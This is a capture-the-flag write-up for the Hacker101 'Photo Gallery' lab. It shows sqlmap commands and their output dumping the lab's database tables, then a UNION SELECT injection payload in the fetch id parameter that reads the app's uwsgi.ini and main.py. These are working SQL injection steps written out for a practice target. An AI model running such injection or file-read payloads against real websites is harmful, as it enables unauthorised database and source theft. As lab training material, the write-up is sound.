# Photo Gallery

## Description
This write up will show how to solve the CTF for "Photo Gallery"

**Difficulty:** Moderate

Hints are not being provided for multiple reasons:</br>
1. It is better to figure it out yourself and I don't want to give spoilers, especially if you don't need one
2. It is only possible to get a hint every once in a while, i.e. it is not possible to get all the hints one after another. This will take too much time to "wait" for all the hints

## Solution 1st flag
The pictures are retrieved with /fetch?id=1, 2, or 3, however, 3 doesn't show any picture data.</br>
As due to id=x, it means something is retrieved, probably from a database.</br>
Using SQLMap, it shows that id might be vulnerable with a boolean-based blind and/or a time-based blind SQLi.</br>

First enumerate the database: `sqlmap -u https://ca0d9cc72e5f2c20b69dd920042e6bdb.ctf.hacker101.com/fetch?id=1 --dbs`</br>
This will return the following:</br>
```
[23:11:59] [INFO] retrieved: 4
[23:12:07] [INFO] retrieved: information_schema
[23:15:22] [INFO] retrieved: level5
[23:16:43] [INFO] retrieved: mysql
[23:17:34] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] level5
[*] mysql
[*] performance_schema
```

level5 will be the database name<br>

As a second step, try to enumerate the tables: `sqlmap -u https://ca0d9cc72e5f2c20b69dd920042e6bdb.ctf.hacker101.com/fetch?id=1 --method=GET --dump -D level5`</br>
There are 2 tables:</br>
```
[23:34:11] [INFO] retrieved: 2
[23:34:22] [INFO] retrieved: albums
[23:35:19] [INFO] retrieved: photos
```

In the same step, it enumerate the columns in the tables, first photos:</br>
```
[23:36:19] [INFO] fetching columns for table 'photos' in database 'level5'
[23:36:19] [INFO] retrieved: 4
[23:36:29] [INFO] retrieved: id
[23:36:44] [INFO] retrieved: title
[23:37:25] [INFO] retrieved: filename
[23:38:31] [INFO] retrieved: parent
```

It will continue, with showing the contents of the table photos:</br>
```
[23:39:31] [INFO] fetching entries for table 'photos' in database 'level5'
[23:39:31] [INFO] fetching number of entries for table 'photos' in database 'level5'
[23:39:31] [INFO] retrieved: 3
[23:39:39] [INFO] retrieved: files/adorable.jpg
[23:42:43] [INFO] retrieved: 1
[23:42:57] [INFO] retrieved: 1
[23:43:05] [INFO] retrieved: Utterly adorable
[23:46:02] [INFO] retrieved: files/purrfect.jpg
[23:49:39] [INFO] retrieved: 2
[23:49:55] [INFO] retrieved: 1
[23:50:04] [INFO] retrieved: Purrfect
[23:51:31] [INFO] retrieved: <<here will be the flag, with the flag tags>>
[00:04:22] [INFO] retrieved: 3
[00:04:37] [INFO] retrieved: 1
[00:04:50] [INFO] retrieved: Invisible
```

And part of that information is that it contains the flag!

## Solution 2nd flag
The third hint, states to look at a config file for the uwsgi-nginx-flask-docker image.</br>
This will be the uwsgi.ini file, hence running the following endpoint in Burp: `/fetch?id=0+UNION+SELECT+'uwsgi.ini`.</br>

This will show the following:
```
[uwsgi]
module = main.py
callable = app
```

Main.py is the main application, hence we can run the same endpoint, but with main.py: `/fetch?id=0+UNION+SELECT+'main.py`.</br>
At the bottom it will show the flag.
